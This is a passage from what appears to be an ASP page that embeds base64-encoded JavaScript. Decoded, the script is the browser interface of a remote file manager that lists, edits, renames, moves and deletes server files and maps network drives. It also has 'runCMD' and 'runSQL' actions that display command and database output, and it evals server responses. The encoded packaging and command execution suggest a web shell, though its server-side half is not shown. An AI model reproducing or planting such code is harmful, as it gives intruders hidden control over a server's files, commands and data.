"YXkucHJvdG90eXBlLnJlbW92ZSA9IGZ1bmN0aW9uKG5hbWUpIHsKCXZhciBpZCA9IHRoaXMubGlzdEZpbmQobmFtZSk7CglpZiAoaWQgPiAtMSkgdGhpcy5zcGxpY2UoaWQsIDEpOwp9CgpBcnJheS5wcm90b3R5cGUubGlzdEZpbmQgPSBmdW5jdGlvbihuYW1lKSB7Cglmb3IoeD0wO3g8dGhpcy5sZW5ndGg7eCsrKQoJewoJCWlm" &_
"KHRoaXNbeF0uc3RhcnRzV2l0aChuYW1lKyJ8IikpIHJldHVybiB4OwoJfQoJcmV0dXJuIC0xOwp9CgpmdW5jdGlvbiBjb21wYXJlTmFtZXMoYSwgYikgewoJdmFyIG5hbWVBID0gYS5zcGxpdCgifCIpWzBdLnRvTG93ZXJDYXNlKCApOwoJdmFyIG5hbWVCID0gYi5zcGxpdCgifCIpWzBdLnRvTG93ZXJDYXNlKCApOwoJaWYgKG5h" &_
"bWVBIDwgbmFtZUIpIHtyZXR1cm4gLTF9CglpZiAobmFtZUEgPiBuYW1lQikge3JldHVybiAxfQoJcmV0dXJuIDA7Cn0KCmZ1bmN0aW9uIGFkZEV2ZW50KG9iaiwgZXZUeXBlLCBmbiwgdXNlQ2FwdHVyZSl7CiAgaWYgKG9iai5hZGRFdmVudExpc3RlbmVyKXsKICAgIG9iai5hZGRFdmVudExpc3RlbmVyKGV2VHlwZSwgZm4sIHVz" &_
"ZUNhcHR1cmUpOwogICAgcmV0dXJuIHRydWU7CiAgfSBlbHNlIGlmIChvYmouYXR0YWNoRXZlbnQpewogICAgdmFyIHIgPSBvYmouYXR0YWNoRXZlbnQoIm9uIitldlR5cGUsIGZuKTsKICAgIHJldHVybiByOwogIH0gZWxzZSB7CiAgICBhbGVydCgiSGFuZGxlciBjb3VsZCBub3QgYmUgYXR0YWNoZWQiKTsKICB9Cn0KCmZ1bmN0" &_
"aW9uIGNyZWF0SW1hZ2UobmFtZSkgewoJaW1nVGFnID0gIiI7CgoJZXh0TmFtZSA9IG5hbWUudG9Mb3dlckNhc2UoKS5zcGxpdCgnLicpOwoJZXh0TmFtZSA9IGV4dE5hbWVbZXh0TmFtZS5sZW5ndGgtMV07CgoJaWYoZXh0X2ltZy5zZWFyY2goJy4nK2V4dE5hbWUrJy4nKSA+IC0xKQoJCWltZ1RhZyA9ICImbmJzcDsmbmJzcDs8" &_
"aW1nIHNyYz0nP21vZGU9aW1hZ2UmaW1nSWQ9aW1nJz48QSBocmVmPScjVmlld3wiICsgZmZMaXN0LmluZm8ucGF0aC5hZGRTbGFzaCgpICsgbmFtZSArICInPiIgKyBuYW1lICsgIjwvQT4iCgllbHNlCgkJaW1nVGFnID0gIiZuYnNwOyZuYnNwOzxpbWcgc3JjPSc/bW9kZT1pbWFnZSZpbWdJZD11bmtub3cnPjxBIGhyZWY9Jz9t" &_
"b2RlPWRvd25sb2FkJmxvY2F0aW9uPSIgKyBmZkxpc3QuaW5mby5wYXRoICsgIiZmaWxlPSIrbmFtZSsiJz4iICsgbmFtZSArICI8L0E+IjsKCglpZihleHRfdGV4dC5zZWFyY2goJy4nK2V4dE5hbWUrJy4nKSA+IC0xKQoJCWltZ1RhZyA9ICImbmJzcDsmbmJzcDs8aW1nIHNyYz0nP21vZGU9aW1hZ2UmaW1nSWQ9dHh0Jz48QSBo" &_
"cmVmPScjRWRpdHwiICsgZmZMaXN0LmluZm8ucGF0aC5hZGRTbGFzaCgpICsgbmFtZSArICInPiIgKyBuYW1lICsgIjwvQT4iOwoKCXJldHVybiBpbWdUYWc7Cn0KCmZ1bmN0aW9uIGdldElkKGlkKSB7Cgl2YXIgbmV3SWQgPSBmYWxzZTsKCglpZiAoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQpIHsgLy8gRE9NMyA9IElFNSwgTlM2" &_
"CgkJbmV3SWQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7Cgl9CgllbHNlIHsKCQlpZiAoZG9jdW1lbnQubGF5ZXJzKSB7IC8vIE5ldHNjYXBlIDQKCQkJbmV3SWQgPSBkb2N1bWVudC5pZDsKCQl9CgkJZWxzZSB7IC8vIElFIDQKCQkJbmV3SWQgPSBkb2N1bWVudC5hbGwuaWQ7CgkJfQoJfQoJcmV0dXJuIG5ld0lkOwp9" &_
"CgpmdW5jdGlvbiBjcmVhdGVSZXF1ZXN0T2JqZWN0KCkgewoJdmFyIHhtbGh0dHAgPSBmYWxzZTsKICBpZiAod2luZG93LlhNTEh0dHBSZXF1ZXN0KSB7CgkgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwoJIGlmICh4bWxodHRwLm92ZXJyaWRlTWltZVR5cGUpIHhtbGh0dHAub3ZlcnJpZGVNaW1lVHlwZSgndGV4dC9o" &_
"dG1sJyk7CiAgfSBlbHNlIGlmICh3aW5kb3cuQWN0aXZlWE9iamVjdCkgewoJIHRyeSB7CgkJeG1saHR0cCA9IG5ldyBBY3RpdmVYT2JqZWN0KCJNc3htbDIuWE1MSFRUUCIpOwoJIH0gY2F0Y2ggKGUpIHsKCQl0cnkgewoJCSAgIHhtbGh0dHAgPSBuZXcgQWN0aXZlWE9iamVjdCgiTWljcm9zb2Z0LlhNTEhUVFAiKTsKCQl9IGNh" &_
"dGNoIChlKSB7fQoJIH0KICB9CiAgcmV0dXJuIHhtbGh0dHA7Cn0KCmZ1bmN0aW9uIHNlbmRSZXF1ZXN0KGxvY2F0aW9uLCBpdGVtU3RhcnQpIHsKCXRyeXsKCQljdXJyZW50X3J1bm5pbmcgPSB0cnVlOwoJCXNob3dMb2FkaW5nKCk7CgkJaWYoIWl0ZW1TdGFydCkgaXRlbVN0YXJ0ID0gMTsKCQlsb2NhdGlvbiA9IGVuY29kZVVS" &_
"SUNvbXBvbmVudChsb2NhdGlvbik7CgkJaHR0cC5vcGVuKCdQT1NUJywgZmZMaXN0LmluZm8uZmlsZXBhdGgrIiIpOwoJCWh0dHAuc2V0UmVxdWVzdEhlYWRlcignQ29udGVudC1UeXBlJywgJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCcpOwoJCWh0dHAub25yZWFkeXN0YXRlY2hhbmdlID0gaGFuZGxlUmVzcG9u" &_
"c2U7CgkJaHR0cC5zZW5kKCdtb2RlPWV4cGxvcmVyJml0ZW1TdGFydD0nICsgaXRlbVN0YXJ0ICsgJyZsb2NhdGlvbj0nK2xvY2F0aW9uKTsKCX0KCWNhdGNoKGUpewoJCWNsZWFyVGltZW91dCAoIHNhdmVUaW1lciApOwoJCWFsZXJ0KCJKYXZhc2NyaXB0IFByb2JsZW0gISEhIik7CgkJc2hvd01vZGUoIkV4cGxvcmVyIiwgZmFs" &_
"c2UpOwoJCWN1cnJlbnRfcnVubmluZyA9IGZhbHNlOwoJCWhpZGVMb2FkaW5nKCk7Cgl9CglmaW5hbGx5e30KfQoKZnVuY3Rpb24gc2VuZFJlcXVlc3RBY3Rpb24obW9kZSwgYWRkaXRpb24pIHsKCXRyeXsKCQljdXJyZW50X3J1bm5pbmcgPSB0cnVlOwoJCXNob3dMb2FkaW5nKCk7CgkJYWRkaXRpb25RdWVyeSA9ICcnOwoKCQlp" &_
"ZigodHlwZW9mKGFkZGl0aW9uKSkudG9Mb3dlckNhc2UoKSA9PSAnb2JqZWN0JykKCQkJaWYoYWRkaXRpb24ubGVudGggPSAyKQoJCQkJaWYoYWRkaXRpb25bMF0ubGVuZ3RoID4gMCAmJiBhZGRpdGlvblswXS5sZW5ndGggPT0gYWRkaXRpb25bMV0ubGVuZ3RoKQoJCQkJCWZvciAoaT0wO2k8YWRkaXRpb25bMF0ubGVuZ3RoO2kr" &_
"Kyl7CgkJCQkJCWFkZGl0aW9uUXVlcnkgKz0gJyYnK2FkZGl0aW9uWzBdW2ldKyc9JytlbmNvZGVVUklDb21wb25lbnQoYWRkaXRpb25bMV1baV0pOwoJCQkJCX0KCgkJaWYoYWRkaXRpb25RdWVyeSA9PSAnJykKCQl7CgkJCWFsZXJ0KCJXcm9uZyByZXF1ZXN0ICEhIik7CgkJCWN1cnJlbnRfcnVubmluZyA9IGZhbHNlOwoJCQlo" &_
"aWRlTG9hZGluZygpOwoJCQlyZXR1cm47CgkJfQoKCQljdXJyZW50X2xvY2F0aW9uID0gZW5jb2RlVVJJQ29tcG9uZW50KGZmTGlzdC5pbmZvLnBhdGgpOwoJCWh0dHAub3BlbignUE9TVCcsIGZmTGlzdC5pbmZvLmZpbGVwYXRoKyIiKTsKCQlodHRwLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHlwZScsICdhcHBsaWNhdGlv" &_
"bi94LXd3dy1mb3JtLXVybGVuY29kZWQnKTsKCQlodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGhhbmRsZUFjdGlvblJlc3BvbnNlOwoJCWh0dHAuc2VuZCgnbW9kZT0nK21vZGUrJyZsb2NhdGlvbj0nK2N1cnJlbnRfbG9jYXRpb24rYWRkaXRpb25RdWVyeSk7Cgl9CgljYXRjaChlKXsKCQljbGVhclRpbWVvdXQgKCBzYXZlVGlt" &_
"ZXIgKTsKCQlhbGVydCgiSmF2YXNjcmlwdCBQcm9ibGVtICEhISIpOwoJCXNob3dNb2RlKCJFeHBsb3JlciIsIHRydWUpOwoJCWN1cnJlbnRfcnVubmluZyA9IGZhbHNlOwoJCWhpZGVMb2FkaW5nKCk7Cgl9CglmaW5hbGx5e30KfQoKZnVuY3Rpb24gaGFuZGxlUmVzcG9uc2UoKSB7Cgl0cnkgewoJCWlmKGh0dHAucmVhZHlTdGF0" &_
"ZSA9PSA0KXsKCQkJdmFyIGNoYW5nZVVybCA9IGZhbHNlOwoJCQl2YXIgcmVzcG9uc2UgPSAnJzsKCQkJaWYgKGh0dHAuc3RhdHVzID09IDIwMCl7CgkJCQlyZXNwb25zZSA9IGh0dHAucmVzcG9uc2VUZXh0OwoJCQkJaWYgKHJlc3BvbnNlLnN0YXJ0c1dpdGgoImxzdFJlc3BvbnNlIikgJiYgZXZhbCgiIiArIHJlc3BvbnNlICsg" &_
"IiIpKSB7CgkJCQkJaWYobHN0UmVzcG9uc2UuZXJyb3IpCgkJCQkJewoJCQkJCQljaGFuZ2VVcmwgPSB0cnVlOwoKCQkJCQkJYWxlcnQoIkNhbid0IGFjY2VzcyB0byBcIiIgKyBsc3RSZXNwb25zZS5pbmZvLnBhdGguYWRkU2xhc2goKSArICJcIiA6ICIgKyBsc3RSZXNwb25zZS5lcnJvci5lcnJvckRlc2MpOwoJCQkJCQlnZXRJ" &_
"ZCgnZXJyQ29kZScpLmlubmVySFRNTCA9IGxzdFJlc3BvbnNlLmVycm9yLmVycm9yOwoJCQkJCQlnZXRJZCgnZXJyRGVzYycpLmlubmVySFRNTCA9ICJDYW4ndCBhY2Nlc3MgdG8gXCIiICsgbHN0UmVzcG9uc2UuaW5mby5wYXRoLmFkZFNsYXNoKCkgKyAiXCIgOiAiICsgbHN0UmVzcG9uc2UuZXJyb3IuZXJyb3JEZXNjOwoJCQkJ" &_
"CQlzaG93ZGl2KCJ0YmxFcnIiLCB0cnVlLCB0cnVlKTsKCQkJCQl9ZWxzZXsKCQkJCQkJc2hvd2RpdigidGJsRXJyIiwgZmFsc2UpOwoJCQkJCQlzaG93ZGl2KCJidExvYWRtb3JlIiwgIWxzdFJlc3BvbnNlLnN0YXR1cy5maW5pc2hlZCk7CgkJCQkJCWlmKGxzdFJlc3BvbnNlLnN0YXR1cy5pdGVtU3RhcnQgPT0gMSl7CgkJCQkJ" &_
"CQlmZkxpc3QgPSBsc3RSZXNwb25zZTsKCQkJCQkJCW5vRm9sZGVyID0gMDsKCQkJCQkJCW5vRmlsZSA9IDA7CgkJCQkJCQlsYXN0VXJsQmFja3VwID0gd2luZG93LmxvY2F0aW9uLmhyZWY7CgkJCQkJCQlnZXRJZCgicmVtb3RlIikudmFsdWU9ZmZMaXN0LmluZm8ucGF0aC5hZGRTbGFzaCgpOwoJCQkJCQkJZ2V0SWQoInJlbW90" &_
"ZUNvcHkiKS52YWx1ZSA9IGZmTGlzdC5pbmZvLnBhdGguYWRkU2xhc2goKTsKCQkJCQkJCWdldElkKCJyZW1vdGVNb3ZlIikudmFsdWUgPSBmZkxpc3QuaW5mby5wYXRoLmFkZFNsYXNoKCk7CgkJCQkJCX1lbHNlewoJCQkJCQkJZmZMaXN0LnN0YXR1cy5pdGVtU3RhcnQgPSBsc3RSZXNwb25zZS5zdGF0dXMuaXRlbVN0YXJ0OwoJ" &_
"CQkJCQkJZmZMaXN0LnN0YXR1cy5maW5pc2hlZCA9IGxzdFJlc3BvbnNlLnN0YXR1cy5maW5pc2hlZDsKCQkJCQkJCWZmTGlzdC5mb2xkZXJzID0gZmZMaXN0LmZvbGRlcnMuY29uY2F0KGxzdFJlc3BvbnNlLmZvbGRlcnMpOwoJCQkJCQkJZmZMaXN0LmZpbGVzID0gZmZMaXN0LmZpbGVzLmNvbmNhdChsc3RSZXNwb25zZS5maWxl" &_
"cyk7CgkJCQkJCX0KCQkJCQkJLy9mZkxpc3QuZm9sZGVycy5zb3J0KGNvbXBhcmVOYW1lcyk7CgkJCQkJCS8vZmZMaXN0LmZpbGVzLnNvcnQoY29tcGFyZU5hbWVzKTsKCQkJCQkJZGlzcGxheUNvbnRlbnQobHN0UmVzcG9uc2UuZm9sZGVycy5sZW5ndGgsIGxzdFJlc3BvbnNlLmZpbGVzLmxlbmd0aCk7CgkJCQkJfQoJCQkJfWVs" &_
"c2V7CgkJCQkJCWlmKHJlc3BvbnNlID09ICcnKXsKCQkJCQkJCWFsZXJ0KCJTZXNzaW9uIFRpbWVvdXQuIFBsZWFzZSBsb2dpbiBhZ2FpbiAhIik7CgkJCQkJCX1lbHNlewoJCQkJCQkJYWxlcnQoIkJhZCByZXNwb25zZSAhISEiKTsKCQkJCQkJfQoJCQkJCQljaGFuZ2VVcmwgPSB0cnVlOwoJCQkJfQoJCQl9ZWxzZXsKCQkJCQlj" &_
"bGVhclRpbWVvdXQgKCBzYXZlVGltZXIgKTsKCQkJCQlhbGVydCgiQmFkIHJlc3BvbnNlIEhUVFAgU3RhdHVzICgiKyBodHRwLnN0YXR1cyArIikgISEhIik7CgkJCQkJY2hhbmdlVXJsID0gdHJ1ZTsKCQkJCX0KCQkJc2hvd01vZGUoJ0V4cGxvcmVyJywgY2hhbmdlVXJsKTsKCQkJY3VycmVudF9ydW5uaW5nID0gZmFsc2U7CgkJ" &_
"CWhpZGVMb2FkaW5nKCk7CgkJfQogIAl9Y2F0Y2goZSl7CgkJY2xlYXJUaW1lb3V0ICggc2F2ZVRpbWVyICk7CgkJYWxlcnQoIkphdmFzY3JpcHQgUHJvYmxlbSAhISEiKTsKCQlzaG93TW9kZSgiRXhwbG9yZXIiLCBmYWxzZSk7CgkJY3VycmVudF9ydW5uaW5nID0gZmFsc2U7CgkJaGlkZUxvYWRpbmcoKTsKCX0KCWZpbmFsbHl7" &_
"fQp9CgpmdW5jdGlvbiBoYW5kbGVBY3Rpb25SZXNwb25zZSgpIHsKCXRyeSB7CgkJaWYoaHR0cC5yZWFkeVN0YXRlID09IDQpewoJCQl2YXIgc2hvd0NvbnRlbnQgPSAiRXhwbG9yZXIiOwoJCQl2YXIgY2hhbmdlVXJsID0gZmFsc2U7CgkJCXZhciByZXNwb25zZSA9ICcnOwoJCQlpZiAoaHR0cC5zdGF0dXMgPT0gMjAwKXsKCQkJ" &_
"CXJlc3BvbnNlID0gaHR0cC5yZXNwb25zZVRleHQ7CgkJCQlpZiAocmVzcG9uc2Uuc3RhcnRzV2l0aCgiYWN0aW9uUmVzcG9uc2UiKSAmJiBldmFsKCIiICsgcmVzcG9uc2UgKyAiIikpIHsKCQkJCQlpZihhY3Rpb25SZXNwb25zZS5hY3Rpb24uZXJyb3IgIT0gMCkKCQkJCQl7CgkJCQkJCWFsZXJ0KGFjdGlvblJlc3BvbnNlLmFj" &_
"dGlvbi5lcnJvckRlc2MpOwoJCQkJCQlnZXRJZCgnZXJyQ29kZScpLmlubmVySFRNTCA9IGFjdGlvblJlc3BvbnNlLmFjdGlvbi5lcnJvcjsKCQkJCQkJZ2V0SWQoJ2VyckRlc2MnKS5pbm5lckhUTUwgPSBhY3Rpb25SZXNwb25zZS5hY3Rpb24uZXJyb3JEZXNjLnJlcGxhY2UoIlxyXG5cclxuIiwgIjxQPiIpLnJlcGxhY2UoIlxy" &_
"XG4iLCAiPEJSPiIpICsgJyZuYnNwOyc7CgoJCQkJCQlzaG93ZGl2KCJ0YmxFcnIiLCB0cnVlLCB0cnVlKTsKCgkJCQkJCXN3aXRjaCAoYWN0aW9uUmVzcG9uc2UuYWN0aW9uLmFjdGlvbil7CgkJCQkJCWNhc2UgInJ1blNRTCIgOgoJCQkJCQkJZGlzcGxheVNRTENvbnRlbnQoYWN0aW9uUmVzcG9uc2UpOwoJCQkJCQkJc2hvd0Nv" &_
"bnRlbnQgPSAiU1FMIjsKCQkJCQkJCWJyZWFrOwoJCQkJCQljYXNlICJydW5DTUQiIDoKCQkJCQkJCXNob3dDb250ZW50ID0gIkNNRCI7CgkJCQkJCQlicmVhazsKCQkJCQkJZGVmYXVsdDoKCQkJCQkJCWNoYW5nZVVybCA9IHRydWU7CgkJCQkJCX0KCQkJCQl9ZWxzZXsKCQkJCQkJc3dpdGNoIChhY3Rpb25SZXNwb25zZS5hY3Rp" &_
"b24uYWN0aW9uKXsKCQkJCQkJY2FzZSAicmVuYW1lRmlsZSIgOgoJCQkJCQkJZmZMaXN0LmZpbGVzW2FjdGlvblJlc3BvbnNlLmFjdGlvbi5maWxlSWRdID0gZmZMaXN0LmZpbGVzW2FjdGlvblJlc3BvbnNlLmFjdGlvbi5maWxlSWRdLnJlcGxhY2UoYWN0aW9uUmVzcG9uc2UuYWN0aW9uLmZpbGVOYW1lLCBhY3Rpb25SZXNwb25z" &_
"ZS5hY3Rpb24ubmV3TmFtZSk7CgkJCQkJCQlnZXRJZCgnZmlsZScrYWN0aW9uUmVzcG9uc2UuYWN0aW9uLmZpbGVJZCkuY2hpbGROb2Rlc1swXS5pbm5lckhUTUwgPSBhZGRGaWxlUm93KGFjdGlvblJlc3BvbnNlLmFjdGlvbi5maWxlSWQpLmNoaWxkTm9kZXNbMF0uaW5uZXJIVE1MOwoJCQkJCQkJZ2V0SWQoJ2ZpbGUnK2FjdGlv" &_
"blJlc3BvbnNlLmFjdGlvbi5maWxlSWQpLmNoaWxkTm9kZXNbNl0uaW5uZXJIVE1MID0gYWRkRmlsZVJvdyhhY3Rpb25SZXNwb25zZS5hY3Rpb24uZmlsZUlkKS5jaGlsZE5vZGVzWzZdLmlubmVySFRNTDsKCQkJCQkJCWJyZWFrOwoJCQkJCQljYXNlICJyZW5hbWVGb2xkZXIiIDoKCQkJCQkJCWZmTGlzdC5mb2xkZXJzW2FjdGlv" &_
"blJlc3BvbnNlLmFjdGlvbi5mb2xkZXJJZF0gPSBmZkxpc3QuZm9sZGVyc1thY3Rpb25SZXNwb25zZS5hY3Rpb24uZm9sZGVySWRdLnJlcGxhY2UoYWN0aW9uUmVzcG9uc2UuYWN0aW9uLmZvbGRlck5hbWUsIGFjdGlvblJlc3BvbnNlLmFjdGlvbi5uZXdOYW1lKTsKCQkJCQkJCWdldElkKCdmb2xkZXInK2FjdGlvblJlc3BvbnNl" &_
"LmFjdGlvbi5mb2xkZXJJZCkuZmlyc3RDaGlsZC5pbm5lckhUTUwgPSAiJm5ic3A7Jm5ic3A7PGltZyBzcmM9Jz9tb2RlPWltYWdlJmltZ0lkPWRpcic+PEEgaHJlZj0nI0V4cGxvcmVyfCIgKyBmZkxpc3QuaW5mby5wYXRoICsgYWN0aW9uUmVzcG9uc2UuYWN0aW9uLm5ld05hbWUuYWRkU2xhc2goKSsiJz4iICsgYWN0aW9uUmVz" &_
"cG9uc2UuYWN0aW9uLm5ld05hbWUgKyAiPC9BPiI7CgkJCQkJCQlicmVhazsKCQkJCQkJY2FzZSAicmVtb3ZlRHJpdmVyIiA6CgkJCQkJCQlnZXRJZCgidGJsRHJpdmVycyIpLmZpcnN0Q2hpbGQucmVtb3ZlQ2hpbGQoZ2V0SWQoImRyaXZlciIgKyBhY3Rpb25SZXNwb25zZS5hY3Rpb24uZHJpdmVyTGV0dGVyKSk7CgkJCQkJCQli" &_
"cmVhazsKCQkJCQkJY2FzZSAibWFwRHJpdmVyIiA6CgkJCQkJCQluZXdSb3cgPSBhZGRUUihhY3Rpb25SZXNwb25zZS5hY3Rpb24uZHJpdmVyTGV0dGVyLCAiZHJpdmVyIik7CgkJCQkJCQluZXdDb2wgPSBhZGRURCgiPGEgaHJlZj0nI0V4cGxvcmVyfCIgKyBhY3Rpb25SZXNwb25zZS5hY3Rpb24uZHJpdmVyTGV0dGVyICsgIjpc" &_
"XCcgdGl0bGU9JyIgKyBhY3Rpb25SZXNwb25zZS5hY3Rpb24ucmVtb3RlU2hhcmUgKyAiJz4mbmJzcDsmbmJzcDtOZXR3b3JrIERyaXZlIFsiICsgYWN0aW9uUmVzcG9uc2UuYWN0aW9uLmRyaXZlckxldHRlciArICI6XTwvYT4mbmJzcDsmbmJzcDs8YSBocmVmPVwiamF2YXNjcmlwdDpyZW1vdmVEcml2ZXIoJyIgKyBhY3Rpb25S" &_
"ZXNwb25zZS5hY3Rpb24uZHJpdmVyTGV0dGVyICsgIicpO1wiPltSZW1vdmVdPC9hPiIsICJrYnJ0bSIpOwoJCQkJCQkJbmV3Um93LmFwcGVuZENoaWxkKG5ld0NvbCk7CgkJCQkJCQlnZXRJZCgidGJsRHJpdmVycyIpLmZpcnN0Q2hpbGQuaW5zZXJ0QmVmb3JlKG5ld1JvdywgZ2V0SWQoImFkZE1hcE5ldHdvcmsiKSk7CgkJCQkJ" &_
"CQlicmVhazsKCQkJCQkJY2FzZSAicnVuQ01EIiA6CgkJCQkJCQlzaG93Q29udGVudCA9ICJDTUQiOwoJCQkJCQkJZ2V0SWQoInR4dENtZFJlc3VsdCIpLnZhbHVlID0gYWN0aW9uUmVzcG9uc2UuYWN0aW9uLnJldHVybkNvbnRlbnQ7CgkJCQkJCQlicmVhazsKCQkJCQkJY2FzZSAicnVuU1FMIiA6CgkJCQkJCQlkaXNwbGF5U1FM" &_
"Q29udGVudChhY3Rpb25SZXNwb25zZSk7CgkJCQkJCQlzaG93Q29udGVudCA9ICJTUUwiOwoJCQkJCQkJYnJlYWs7CgkJCQkJCWNhc2UgImxvYWRGaWxlIiA6CgkJCQkJCQlpZihhY3Rpb25SZXNwb25zZS5hY3Rpb24uaXRlbVNpemUgPiA1MTIwMDApewoJCQkJCQkJCWFsZXJ0KCJGaWxlIHNpemUgaXMgdG9vIGxhcmdlICgiICsg" &_
"YWN0aW9uUmVzcG9uc2UuYWN0aW9uLml0ZW1TaXplVGV4dCArICIpLCBtYXhpbXVtIGlzIDUwMEtCLiBJdCBtYXkgY2F1c2UgeW91ciBicm93c2VyIGZyZWV6ZSAhIik7CgkJCQkJCQkJY2hhbmdlVXJsID0gdHJ1ZTsKCQkJCQkJCX1lbHNlewoJCQkJCQkJCXNob3dDb250ZW50ID0gIkVkaXQiOwoJCQkJCQkJCWdldElkKCJ0eHRD" &_
"b250ZW50IikudmFsdWUgPSBhY3Rpb25SZXNwb25zZS5hY3Rpb24uaXRlbUNvbnRlbnQ7CgkJCQkJCQkJZ2V0SWQoImxibEZpbGUiKS5pbm5lckhUTUwgPSBnZXRWYXIod2luZG93LmxvY2F0aW9uLmhyZWYsMSk7CgkJCQkJCQl9CgkJCQkJCQlicmVhazsKCQkJCQkJY2FzZSAic2F2ZUZpbGUiIDoKCQkJCQkJCXNob3dDb250ZW50" &_
"ID0gIkVkaXQiOwoJCQkJCQkJdmFyIGVkaXRQYXRoID0gZ2V0VmFyKHdpbmRvdy5sb2NhdGlvbi5ocmVmLDEpLnNwbGl0KCJcXCIpOwoJCQkJCQkJZ2V0SWQoImxibEZpbGUiKS5pbm5lckhUTUwgPSBnZXRWYXIod2luZG93LmxvY2F0aW9uLmhyZWYsMSk7CgkJCQkJCQlpZighc2F2ZVRpbWVyKQoJCQkJCQkJCWFsZXJ0KCJGaWxl" &_
"ICIgKyBlZGl0UGF0aFtlZGl0UGF0aC5sZW5ndGgtMV0gKyAiIHNhdmVkICEiKTsKCQkJCQkJCWJyZWFrOwoJCQkJCQljYXNlICJuZXdGaWxlIiA6CgkJCQkJCQlub0ZpbGUgKz0gMTsKCQkJCQkJCXNldEl0ZW1zQ291bnQoKTsKCQkJCQkJCWZmTGlzdC5maWxlcy5wdXNoKGFjdGlvblJlc3BvbnNlLmFjdGlvbi5uZXdJdGVtKTsK" &_
"CQkJCQkJCWdldElkKCJ0YmxMaXN0IikuaW5zZXJ0QmVmb3JlKGFkZEZpbGVSb3coZmZMaXN0LmZpbGVzLmxpc3RGaW5kKGFjdGlvblJlc3BvbnNlLmFjdGlvbi5uZXdJdGVtLnNwbGl0KCJ8IilbMF0pKSwgZ2V0SWQoInRibExpc3QiKS5sYXN0Q2hpbGQubmV4dFNpYmxpbmcpOwoJCQkJCQkJYnJlYWs7CgkJCQkJCWNhc2UgIm5l" &_
"d0ZvbGRlciIgOgoJCQkJCQkJbm9Gb2xkZXIgKz0gMTsKCQkJCQkJCXNldEl0ZW1zQ291bnQoKTsKCQkJCQkJCWZmTGlzdC5mb2xkZXJzLnB1c2goYWN0aW9uUmVzcG9uc2UuYWN0aW9uLm5ld0l0ZW0pOwoJCQkJCQkJZ2V0SWQoInRibExpc3QiKS5pbnNlcnRCZWZvcmUoYWRkRm9sZGVyUm93KGZmTGlzdC5mb2xkZXJzLmxpc3RG" &_
"aW5kKGFjdGlvblJlc3BvbnNlLmFjdGlvbi5uZXdJdGVtLnNwbGl0KCJ8IilbMF0pKSwgZ2V0SWQoImdhcDAiKSk7CgkJCQkJCQlicmVhazsKCQkJCQkJY2FzZSAibW92ZSIgOgoJCQkJCQljYXNlICJkZWxldGUiIDoKCQkJCQkJCXJzcEZvbGRlcnMgPSBhY3Rpb25SZXNwb25zZS5hY3Rpb24uZm9sZGVyc0lkLnNwbGl0KCJ8Iik7" &_
"CgkJCQkJCQlyc3BGaWxlcyA9IGFjdGlvblJlc3BvbnNlLmFjdGlvbi5maWxlc0lkLnNwbGl0KCJ8Iik7CgoJCQkJCQkJaWYocnNwRm9sZGVycy5sZW5ndGggPiAxKQoJCQkJCQkJewoJCQkJCQkJCWZvcihpPTA7aTxyc3BGb2xkZXJzLmxlbmd0aC0xO2krKykKCQkJCQkJCQl7CgkJCQkJCQkJCW5vRm9sZGVyIC09IDE7CgkJCQkJ" &_
"CQkJCXNldEl0ZW1zQ291bnQoKTsKCQkJCQkJCQkJZ2V0SWQoInRibExpc3QiKS5yZW1vdmVDaGlsZChnZXRJZCgiZm9sZGVyIiArIGZmTGlzdC5mb2xkZXJzLmxpc3RGaW5kKHJzcEZvbGRlcnNbaV0pKSk7CgkJCQkJCQkJfQoJCQkJCQkJfQoKCQkJCQkJCWlmKHJzcEZpbGVzLmxlbmd0aCA+IDEpCgkJCQkJCQl7CgkJCQkJCQkJ" &_
"Zm9yKGk9MDtpPHJzcEZpbGVzLmxlbmd0aC0xO2krKykKCQkJCQkJCQl7CgkJCQkJCQkJCW5vRmlsZSAtPSAxOwoJCQkJCQkJCQlzZXRJdGVtc0NvdW50KCk7CgkJCQkJCQkJCWdldElkKCJ0YmxMaXN0IikucmVtb3ZlQ2hpbGQoZ2V0SWQoImZpbGUiICsgZmZMaXN0LmZpbGVzLmxpc3RGaW5kKHJzcEZpbGVzW2ldKSkpOwoJCQkJ" &_
"CQkJCX0KCQkJCQkJCX0KCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCXNob3dkaXYoInRibEVyciIsIGZhbHNlKTsKCQkJCQkJaWYoYWN0aW9uUmVzcG9uc2UuYWN0aW9uLm1zZ1Jlc3BvbnNlKQoJCQkJCQkJYWxlcnQoYWN0aW9uUmVzcG9uc2UuYWN0aW9uLm1zZ1Jlc3BvbnNlKTsKCQkJCQl9CgkJCQl9ZWxzZXsKCQkJCQkJ" &_
"aWYocmVzcG9uc2UgPT0gJycpewoJCQkJCQkJYWxlcnQoIlNlc3Npb24gVGltZW91dC4gUGxlYXNlIGxvZ2luIGFnYWluICEiKTsKCQkJCQkJfWVsc2V7CgkJCQkJCQlhbGVydCgiQmFkIHJlc3BvbnNlICEhISIpOwoJCQkJCQl9CgkJCQkJCWNoYW5nZVVybCA9IHRydWU7CgkJCQl9CgkJCX1lbHNlewoJCQkJCWNsZWFyVGltZW91" &_
"dCAoIHNhdmVUaW1lciApOwoJCQkJCWFsZXJ0KCJCYWQgcmVzcG9uc2UgSFRUUCBTdGF0dXMgKCIrIGh0dHAuc3RhdHVzICsiKSAhISEiKTsKCQkJCQljaGFuZ2VVcmwgPSB0cnVlOwoJCQkJfQoJCQlpZighc2F2ZVRpbWVyKXsKCQkJCXNob3dNb2RlKHNob3dDb250ZW50LCBjaGFuZ2VVcmwpOwoJCQkJaGlkZUxvYWRpbmcoKTsK" &_
"CQkJfQoJCQljdXJyZW50X3J1bm5pbmcgPSBmYWxzZTsKCQl9Cgl9Y2F0Y2goZSl7CgkJY2xlYXJUaW1lb3V0ICggc2F2ZVRpbWVyICk7CgkJYWxlcnQoIkphdmFzY3JpcHQgUHJvYmxlbSAhISEiKTsKCQlzaG93TW9kZSgiRXhwbG9yZXIiLCBmYWxzZSk7CgkJY3VycmVudF9ydW5uaW5nID0gZmFsc2U7CgkJaGlkZUxvYWRpbmco" &_
